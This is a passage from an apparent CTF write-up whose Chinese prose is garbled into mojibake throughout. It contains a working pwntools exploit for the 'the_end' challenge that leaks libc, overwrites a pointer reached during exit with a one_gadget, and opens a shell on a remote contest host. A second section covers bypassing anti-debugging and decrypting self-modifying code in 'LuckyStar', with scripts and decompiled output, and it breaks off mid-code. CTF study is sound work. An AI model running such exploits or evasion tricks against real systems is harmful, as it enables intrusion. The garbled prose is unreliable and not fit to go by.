<p>æŠŠ sleep å‡½æ•°çš„åœ°å€ç»™å‡ºï¼Œlibc çš„åŸºåœ°å€ä¹Ÿå°±çŸ¥é“äº†ï¼Œç´§æ¥ç€å°±æ˜¯ 5 æ¬¡çš„ä»»æ„åœ°å€å†™ï¼Œæ£€æŸ¥å¼€å¯çš„ä¿æŠ¤å‘ç°é™¤äº† canary å…¨éƒ¨å¼€å¯ï¼Œè€ƒè™‘ä¸€ä¸‹ write-what-whereï¼Œç°åœ¨åªæœ‰ where ä¸çŸ¥é“ï¼Œè€Œä¸”ç¨‹åºåœ¨ read ä¹‹åå°±è°ƒç”¨ exit é€€å‡ºäº†ï¼Œè²Œä¼¼æ²¡æœ‰ç•™ä¸‹ä»»ä½•çš„åˆ©ç”¨ç©ºé—´ï¼Œé‚£ä¸€ä¸ªè‡ªç„¶çš„æ€è·¯å°±æ˜¯èƒ½å¦åˆ©ç”¨ exit å‡½æ•°å‘¢ï¼Ÿ<br>èµ›ä¸­æˆ‘è€ƒè™‘è¿‡è¿™ä¸€ç‚¹ï¼Œä½†æ˜¯åœ¨ google ä¸Šæ²¡æœ‰æ‰¾åˆ°ç›¸å…³çš„åˆ©ç”¨å§¿åŠ¿ï¼Œèµ›åçœ‹äº†å¤§ä½¬çš„ wp å‘ç°è¿™é“é¢˜å’Œ 0x00 ctf 2017 çš„ left é¢˜ç›®ç›¸ä¼¼(ä¸ºä»€ä¹ˆæˆ‘æ¯”èµ›çš„æ—¶å€™æ‰¾ä¸åˆ° ORZ)ï¼Œè€Œä¸”è¿™é“é¢˜æ›´ç®€å•ä¸€äº›ã€‚<br>è¿™é“é¢˜çš„åŸºæœ¬æ€è·¯å°±æ˜¯ä» exit å‡½æ•°å…¥æ‰‹ï¼Œç”±äºåªçŸ¥é“ libc çš„åœ°å€ï¼Œè€Œä¸”ä¿®æ”¹çš„æ—¶å€™ç›®çš„åœ°å€å¿…é¡»æ˜¯å¯å†™çš„ï¼Œäºæ˜¯æˆ‘ä»¬è¦å¯»æ‰¾ç±»ä¼¼ call eax è¿™ç±»åŠ¨æ€è°ƒç”¨çš„å‡½æ•°ï¼Œå®ƒä»¬ææœ‰å¯èƒ½æ˜¯ä» libc çš„å¯å†™åœ°å€å–å‡ºçš„å‡½æ•°ã€‚<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒè¯•æ¥çœ‹ï¼Œæ­¥å…¥ exit å‡½æ•°(æ¯æ¬¡éƒ½ç”¨ si æ­¥å…¥æ¯ä¸ªå‡½æ•°)ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/theend1.png"
                      alt="image"
                ><br>è¿™é‡Œæœ‰ä¸€å¥ call edxï¼Œä½†æ˜¯è·Ÿè¿‡å»çœ‹ä¸€ä¸‹å†…å­˜ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/theend2.png"
                      alt="image"
                ><br>åœ°å€æ˜¯ä¹±æ‰çš„ï¼Œè€Œä¸”è§‚å¯Ÿåˆ° mov ç»™ edx ä¹‹åè¿˜æœ‰å¯¹ edx çš„è§£å¯†æ“ä½œï¼Œè¿™æ˜¯ libc ä¸ºäº†é˜²æ­¢é’ˆå¯¹ _dl_fini æ”»å‡»è€Œé‡‡å–çš„æªæ–½ï¼ŒåŠ å¯†ç”¨åˆ°äº†ä¸€ä¸ª tokenï¼Œæ— æ³•æ³„éœ²ã€‚<br>äºæ˜¯ç»§ç»­è·Ÿè¿›ï¼Œåœ¨è¿™é‡Œæ‰¾åˆ°äº†å¦ä¸€å¤„ä¼¼ä¹å¯ä»¥åˆ©ç”¨çš„ä»£ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/theend3.png"
                      alt="image"
                ><br>call äº† libc ä¸­æ•°æ®æ®µä¸Šçš„ä¸€ä¸ªä½ç½®ï¼Œè¿™ä¸ªä½ç½®æ˜¯å¯å†™çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªåœ°å€è¦†ç›–ä¸º one_gadget ï¼Œè·å– shellã€‚  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug = 0</span><br><span class="line">if debug == 1:</span><br><span class="line">    p = process(&quot;./the_end&quot;)</span><br><span class="line">elif debug == 0:</span><br><span class="line">    token = &quot;KjMul8pLu4iagbDcJVMNCWaFdJ26Pc4y&quot;</span><br><span class="line">    p = remote(&quot;150.109.44.250&quot;, 20002)</span><br><span class="line">    p.recvuntil(&quot;Input your token:&quot;)</span><br><span class="line">    p.sendline(token)</span><br><span class="line">context(log_level=&quot;DEBUG&quot;)</span><br><span class="line">libc = ELF(&quot;./libc64.so&quot;)</span><br><span class="line">p.recvuntil(&quot;here is a gift &quot;)</span><br><span class="line">sleep_addr = int(p.recv(14),16)</span><br><span class="line">log.info(&quot;Sleep_addr = 0x%x&quot;, sleep_addr)</span><br><span class="line">libc_addr = sleep_addr - libc.symbols[&quot;sleep&quot;]</span><br><span class="line">log.success(&quot;libc addr : 0x%x&quot; % libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0xf02a4</span><br><span class="line">log.info(&quot;one gadget = 0x%x&quot; % one_gadget)</span><br><span class="line">rtld_global = libc_addr + 0x5f0f48</span><br><span class="line">log.info(&quot;rtd_global = 0x%x&quot; % rtld_global)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&quot;;)\n&quot;)</span><br><span class="line">payload1 = p64(rtld_global)</span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[0])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(rtld_global + 1)</span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[1])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload3 = p64(rtld_global + 2)</span><br><span class="line">p.send(payload3)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[2])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload4 = p64(rtld_global + 3)</span><br><span class="line">p.send(payload4)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[3])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">payload5 = p64(rtld_global + 4)</span><br><span class="line">p.send(payload5)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget)[4])</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;cat flag&gt;&amp;0&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¶ç€ç¯å¢ƒè¿˜æ²¡å…³ï¼Œå¯ä»¥æ‹¿åˆ° flagï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/theend4.png"
                      alt="image"
                ></p>
<p>æ³¨æ„æœ€åå‘é€å‘½ä»¤çš„æ—¶å€™éœ€è¦é‡å®šå‘è¾“å…¥ï¼Œå› ä¸ºç¨‹åºåœ¨ä¸€å¼€å§‹å°± close(1) ï¼Œå…³é—­äº† stdoutï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘åœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™å°±ä¸èƒ½è¾“å‡º flagï¼Œè¿œç¨‹å°±å¯ä»¥äº†â€¦<br>éœ€è¦æ³¨æ„ one gadget é™åˆ¶çš„å¾ˆæ­»ï¼Œæ‰¾åˆ°çš„å››ä¸ªåªæœ‰è¿™ä¸€ä¸ªèƒ½ç”¨ã€‚</p>
<p>è¿™ä¸ªåº”è¯¥æ˜¯é¢„æœŸè§£ï¼Œä½†æ˜¯çœ‹åˆ°å¸ˆå‚…ä»¬è¿˜æœ‰ä¸€ç§åšæ³•æ˜¯æ”¹äº† vtableï¼Œæœ‰æ—¶é—´ä»”ç»†ç ”ç©¶ä¸€ä¸‹ã€‚</p>
<h2 id="LuckyStar"><a href="#LuckyStar" class="headerlink" title="LuckyStar"></a>LuckyStar</h2><h3 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h3><p><strong>è¸©äº†å¾ˆå¤šå‘ï¼Œè¸©å‘çš„è¿‡ç¨‹å°±ä¸å†™äº†ã€‚ã€‚ã€‚</strong></p>
<p>é¦–å…ˆè°ƒç”¨äº† TLSCallBack å…¶ä¸­å¯¹ä¸€ä¸ªå‡½æ•°(ä¸»å‡½æ•°)è¿›è¡Œäº†è§£å¯†ï¼ŒåŒ…æ‹¬å¤§æ¦‚ä¸¤ç§åè°ƒè¯•æ‰‹æ®µ.</p>
<p>ä¹‹åä¼šæ‰§è¡Œ start å‡½æ•°ï¼Œé€šå¸¸è¿™æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨æ’å…¥çš„å¯åŠ¨ä»£ç ï¼Œä½†æ˜¯åœ¨æœ¬é¢˜ä¸­ï¼Œè¿™ä¸ªä»£ç è¢«å‡ºé¢˜äººä¿®æ”¹è¿‡ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›å’Œflagè¿ç®—ç›¸å…³çš„ä»£ç ã€‚<br>ç›´æ¥åç¼–è¯‘ start å‡½æ•°ï¼Œå‘ç°ä¼ªä»£ç ä¸­æœ‰è®¸å¤šå‡½æ•°æ²¡æœ‰æœ‰æ„ä¹‰çš„åå­—ï¼Œè¿˜å¤¹æ‚ç€ä¸€äº›è™šå‡½æ•°ï¼Œå•ä»é™æ€ä»£ç çœ‹å¾ˆéš¾ï¼Œæ‰€ä»¥æ¨èä½¿ç”¨ OD é…åˆåˆ†æã€‚<br>åœ¨ start å‡½æ•°ä¸­ä¼šè°ƒç”¨ä¹‹å‰è§£å¯†çš„å‡½æ•°å¯¹å¦ä¸€ä¸ªå‡½æ•°è§£å¯†ï¼Œè®¡ç®—è¾“å…¥å¹¶ä¸”å’ŒåŠ å¯†çš„ flag è¿›è¡Œå¯¹æ¯”ã€‚</p>
<h3 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h3><p>OD è°ƒè¯•çš„æ—¶å€™è¦æ³¨æ„ç»•è¿‡åè°ƒè¯•ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸è¿›å…¥ start å‡½æ•°ã€‚<br>åœ¨ TLSCallBack å‡½æ•°ä¸­å­˜åœ¨ä¸¤å¤„åè°ƒè¯•ï¼Œç¬¬ä¸€ä¸ªæ˜¯éå†æ‰€æœ‰è¿›ç¨‹ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨ IDA OD æˆ–è€… x32DBGç­‰å·¥å…·ï¼Œå°†ç¨‹åºä¸­ç¡¬ç¼–ç çš„å­—ç¬¦ä¸² patch æ‰å³å¯ç»•è¿‡ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar1.png"
                      alt="image"
                ><br>ä¸Šå›¾æ˜¯æˆ‘ patch ä¹‹åçš„æ•ˆæœï¼Œå†æ¬¡è¿è¡Œå°±èƒ½ç»•è¿‡è¿™ä¸ªåè°ƒè¯•ã€‚</p>
<p>ç¬¬äºŒå¤„é‡‡ç”¨ç³»ç»Ÿè°ƒç”¨ zwsetinformationthreadï¼Œå¹¶è®¾ç½®å‡½æ•°å‚æ•°ä¸º </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);</span><br></pre></td></tr></table></figure></div>
<p>å°†å½“å‰è¿›ç¨‹éšè—(æ³¨æ„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ 0x11)ï¼Œè°ƒè¯•å™¨æ— æ³•ç»§ç»­è·Ÿè¸ªï¼Œé€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°çš„å‚æ•°å³å¯ç»•è¿‡ã€‚<br>å•æ­¥åˆ°å¯¹åº”çš„ä½ç½®å¤„(push 0x11)ï¼Œæˆ‘å°† push åˆ°æ ˆä¸Šçš„ 0x11 æ”¹æˆ -2ï¼Œç»•è¿‡è¿™ä¸ªåè°ƒè¯•ã€‚</p>
<p>patch æ‰åè°ƒè¯•ä¹‹åï¼Œå¯ä»¥å‘ç°è§£å¯†ç¬¬ä¸€ä¸ªå‡½æ•°çš„ç®—æ³•ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar2.png"
                      alt="image"
                ><br>å…ˆ srand è®¾ç½®éšæœºæ•°ç§å­ï¼Œç„¶åå¯¹ 0x401780 å¼€å§‹çš„ 440 ä¸ªå­—èŠ‚è¿›è¡Œè§£å¯†ï¼Œç®—æ³•åœ¨ä¼ªä»£ç ä¸­å¾ˆæ¸…æ™°ï¼Œæˆ‘ç¼–å†™äº†ä¸€ä¸ª C ç¨‹åºè·å–éšæœºæ•°ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    srand(0x61616161);</span><br><span class="line">    int token[1000];</span><br><span class="line">    int i;</span><br><span class="line">    for(i = 0; i &lt; 1000; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        token[i] = rand() % 0x2018;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i = 0; i &lt; 1000; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;0x%02x,&quot;,token[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿˜æœ‰ä¸€ä¸ª IDA-Python è„šæœ¬å°†å‡½æ•°è§£å¯†ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 0x417000</span><br><span class="line">b = a + 8327168</span><br><span class="line">select = []</span><br><span class="line">while a &lt;=b :</span><br><span class="line">    select.append(Byte(a))</span><br><span class="line">    a += 1</span><br><span class="line">token = [*]    # éšæœºæ•°å¤ªé•¿ï¼Œè¿™é‡Œå°±ä¸å†™å‡ºæ¥äº†ã€‚ã€‚ã€‚</span><br><span class="line">v11 = 0x401780</span><br><span class="line">v12 = 440</span><br><span class="line">tt = 0</span><br><span class="line">while v12 &gt; 0:</span><br><span class="line">    v11 = v11 + 1</span><br><span class="line">    PatchByte(v11 - 1, Byte(v11 - 1) ^ select[token[tt]])</span><br><span class="line">    tt += 1</span><br><span class="line">    v12 -= 1</span><br></pre></td></tr></table></figure></div>
<p>ç»è¿‡æ¸…æ´—çš„å‡½æ•°å¯ä»¥æ­£å¸¸åç¼–è¯‘æˆä¼ªä»£ç (æ³¨æ„å¯èƒ½éœ€è¦å…ˆå¯¹ä»£ç æŒ‰ U é”®å…¨éƒ¨å–æ¶ˆè§£æï¼Œç„¶åå† C é”®è½¬æ¢æˆä»£ç )ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_401780@&lt;eax&gt;(<span class="type">int</span> a1@&lt;ebp&gt;, <span class="type">int</span> a2@&lt;edi&gt;, <span class="type">int</span> a3@&lt;esi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// ST24_4</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp-CCh] [ebp-D8h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-C8h] [ebp-D4h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp-C4h] [ebp-D0h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp-C0h] [ebp-CCh]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp-BCh] [ebp-C8h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp-B8h] [ebp-C4h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp-B4h] [ebp-C0h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp-B0h] [ebp-BCh]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [esp-ACh] [ebp-B8h]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp-A8h] [ebp-B4h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [esp-A4h] [ebp-B0h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [esp-A0h] [ebp-ACh]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [esp-9Ch] [ebp-A8h]</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [esp-98h] [ebp-A4h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [esp-94h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [esp-90h] [ebp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [esp-8Ch] [ebp-98h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [esp-88h] [ebp-94h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [esp-84h] [ebp-90h]</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [esp-80h] [ebp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [esp-7Ch] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [esp-78h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// [esp-74h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// [esp-70h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// [esp-6Ch] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// [esp-68h] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// [esp-64h] [ebp-70h]</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// [esp-60h] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// [esp-5Ch] [ebp-68h]</span></span><br><span class="line">  <span class="type">int</span> v44; <span class="comment">// [esp-58h] [ebp-64h]</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// [esp-54h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// [esp-50h] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v47; <span class="comment">// [esp-4Ch] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v48; <span class="comment">// [esp-48h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// [esp-44h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> v50; <span class="comment">// [esp-40h] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v51; <span class="comment">// [esp-3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// [esp-38h] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v53; <span class="comment">// [esp-34h] [ebp-40h]</span></span><br><span class="line">  __int128 v54; <span class="comment">// [esp-30h] [ebp-3Ch]</span></span><br><span class="line">  __int64 v55; <span class="comment">// [esp-20h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// [esp-18h] [ebp-24h]</span></span><br><span class="line">  __int16 v57; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v58; <span class="comment">// [esp-4h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v59; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v60; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> retaddr; <span class="comment">// [esp+Ch] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v59 = a1;</span><br><span class="line">  v60 = retaddr;</span><br><span class="line">  v58 = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v59 ^ __security_cookie;</span><br><span class="line">  v15 = a3;</span><br><span class="line">  CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  sub_401020(<span class="string">&quot;%s\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !dword_40737C )</span><br><span class="line">  &#123;</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    sub_401020(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401020(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    *((_BYTE *)&amp;loc_4015E0 + v3++) ^= byte_417000[rand() % <span class="number">8216</span>];</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">383</span> );</span><br><span class="line">  sub_401020(<span class="string">&quot;Shining!\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v54 = <span class="number">0</span>i64;</span><br><span class="line">  v55 = <span class="number">0</span>i64;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v36, <span class="number">0</span>, <span class="number">0x46</span>u);</span><br><span class="line">  sub_401020(<span class="string">&quot;My Darling Darling Please!\ninput your key!\n&quot;</span>);</span><br><span class="line">  sub_401050(<span class="string">&quot;%29s&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v54);</span><br><span class="line">  ((<span class="type">void</span> (__stdcall *)(__int128 *, <span class="type">int</span> *, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, _DWORD))loc_4015E0)(</span><br><span class="line">    &amp;v54,</span><br><span class="line">    &amp;v36,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    v6,</span><br><span class="line">    v7,</span><br><span class="line">    v8,</span><br><span class="line">    v9,</span><br><span class="line">    v10,</span><br><span class="line">    v11,</span><br><span class="line">    a2,</span><br><span class="line">    v15,</span><br><span class="line">    v16,</span><br><span class="line">    v17,</span><br><span class="line">    v18,</span><br><span class="line">    v19,</span><br><span class="line">    v20,</span><br><span class="line">    v21,</span><br><span class="line">    v22,</span><br><span class="line">    v23,</span><br><span class="line">    v24,</span><br><span class="line">    v25,</span><br><span class="line">    v26,</span><br><span class="line">    v27,</span><br><span class="line">    v28,</span><br><span class="line">    v29,</span><br><span class="line">    v30,</span><br><span class="line">    v31,</span><br><span class="line">    v32,</span><br><span class="line">    v33,</span><br><span class="line">    v34,</span><br><span class="line">    v35,</span><br><span class="line">    v36,</span><br><span class="line">    v37,</span><br><span class="line">    v38,</span><br><span class="line">    v39,</span><br><span class="line">    v40,</span><br><span class="line">    v41,</span><br><span class="line">    v42,</span><br><span class="line">    v43,</span><br><span class="line">    v44,</span><br><span class="line">    v45,</span><br><span class="line">    v46,</span><br><span class="line">    v47,</span><br><span class="line">    v48,</span><br><span class="line">    v49,</span><br><span class="line">    v50,</span><br><span class="line">    v51,</span><br><span class="line">    v52,</span><br><span class="line">    v53,</span><br><span class="line">    v54);</span><br><span class="line">  *(_OWORD *)&amp;v18 = xmmword_403520;</span><br><span class="line">  *(_OWORD *)&amp;v22 = xmmword_403530;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  LOWORD(v35) = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)&amp;v26 = <span class="number">0</span>i64;</span><br><span class="line">  *(_OWORD *)&amp;v30 = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v36, (<span class="type">const</span> <span class="type">char</span> *)&amp;v18);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    v12 = -(v12 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  v13 = <span class="string">&quot;Maybe next year&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">    v13 = <span class="string">&quot;Nice Job~&quot;</span>;</span><br><span class="line">  sub_401020(v13);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å…¶ä»–ä½ç½®è¿˜æ¯”è¾ƒå¥½çœ‹ï¼Œä½†æ˜¯ä¸­é—´æœ‰ä¸€ä¸ªå‡½æ•°ä¸æ­£å¸¸ï¼Œè¿™å°±æ˜¯ç¬¬äºŒä¸ªè¦è§£å¯†çš„å‡½æ•°ï¼Œè§‚å¯Ÿè§£å¯†ç®—æ³•ï¼Œå’Œç¬¬ä¸€ä¸ªå‡½æ•°çš„ç®—æ³•ä¸€æ ·ï¼Œä½†æ˜¯å¦‚æœä½ å°è¯•ä½¿ç”¨ç¬¬ä¸€ä¸ªè„šæœ¬è§£å¯†çš„è¯ï¼Œæ˜¯ä¸èƒ½æ­£å¸¸è§£å‡ºæ¥çš„ã€‚<br>çŒœæƒ³åŸå› å°±æ˜¯éšæœºæ•°ç§å­ä¸å†æ˜¯ 0x61616161 äº†ï¼Œåœ¨ç¨‹åºè¿è¡Œä¸­ srand è¿›è¡Œäº†æ›´æ¢ã€‚  </p>
<p>ä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°å“ªé‡Œæ›´æ¢äº†éšæœºæ•°ç§å­ï¼Œç»§ç»­è°ƒè¯•ï¼Œå•æ­¥åˆ° start å‡½æ•°(æˆ–è€…å‚è€ƒ IDA çš„åœ°å€ç›´æ¥ä¸‹æ–­ç‚¹)ï¼Œåˆ†æ start å‡½æ•°ï¼ŒæŠ›å¼€å‰é¢çš„åˆå§‹åŒ–æµç¨‹ä¸çœ‹ï¼Œåœ¨ç¬¬ <strong>44</strong> è¡Œå‘ç°äº†ä¸€ä¸ªå¼‚å¸¸å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__usercall sub_402510@&lt;eax&gt;(<span class="type">signed</span> <span class="type">int</span> a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// [esp-8h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// [esp-4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  (*(a1 - <span class="number">20</span>))(<span class="number">-1</span>, &amp;v4);</span><br><span class="line">  v1 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    v5 = <span class="number">268439909</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = 